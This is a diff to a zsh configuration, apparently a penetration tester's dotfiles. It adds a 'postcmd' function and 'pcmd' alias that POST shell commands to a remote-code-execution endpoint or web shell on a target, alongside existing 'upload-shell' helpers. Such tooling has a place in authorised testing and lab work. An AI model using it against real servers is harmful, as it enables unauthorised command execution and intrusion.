@@ -155,6 +155,73 @@ shell-cmd() {
   echo ""
 }
 
+_postcmd-py() {
+  echo "${ZDOTDIR:-$HOME/.zsh}/postcmd.py"
+}
+
+# POST form RCE; print .cmd div sans forms
+postcmd() {
+  local py="$(_postcmd-py)"
+  local url="" field="${POSTCMD_FIELD:-cmd}" insecure=false
+  local -a extra=() rest=()
+
+  while [[ $# -gt 0 ]]; do
+    case "$1" in
+      -h|--help)
+        echo "usage: postcmd -u url [-f field] [-F key=val] [-k] [command...]"
+        echo "  url:  -u or POSTCMD_URL (required unless POSTCMD_URL is set)"
+        echo "  field: POST field for shell cmd (default: cmd, or POSTCMD_FIELD)"
+        echo "  example: postcmd -u http://\$IP/form.php id"
+        echo "  example: postcmd -u http://\$IP/rce.php -f cmd 'ls -la /var/www'"
+        return 0
+        ;;
+      -u|--url)
+        url="$2"
+        shift 2
+        ;;
+      -f|--field)
+        field="$2"
+        shift 2
+        ;;
+      -F)
+        extra+=(-F "$2")
+        shift 2
+        ;;
+      -k|--insecure)
+        insecure=true
+        shift
+        ;;
+      http://*|https://*)
+        url="$1"
+        shift
+        ;;
+      *)
+        rest+=("$1")
+        shift
+        ;;
+    esac
+  done
+
+  url="${url:-${POSTCMD_URL:-}}"
+  if [[ -z "$url" ]]; then
+    echo "usage: postcmd -u url [command...]  (or: export POSTCMD_URL=...)" >&2
+    return 1
+  fi
+
+  local -a py_args=(-u "$url" -f "$field")
+  $insecure && py_args+=(-k)
+  (( ${#extra[@]} )) && py_args+=("${extra[@]}")
+  if (( ${#rest[@]} )); then
+    py_args+=("${rest[@]}")
+  else
+    py_args+=(id)
+  fi
+
+  python3 "$py" "${py_args[@]}"
+}
+
+alias pcmd='postcmd'
+
 upsh() {
   upload-shell "$@"
 }
@@ -174,3 +241,14 @@ _upload-shell() {
 }
 
 compdef _upload-shell upload-shell upsh
+
+_postcmd() {
+  _arguments \
+    '-u[url]:url:_urls' \
+    '-f[POST field name]:field name:' \
+    '-F[extra field]:key=value:' \
+    '-k[skip TLS verify]' \
+    '*:command:_default'
+}
+
+compdef _postcmd postcmd pcmd
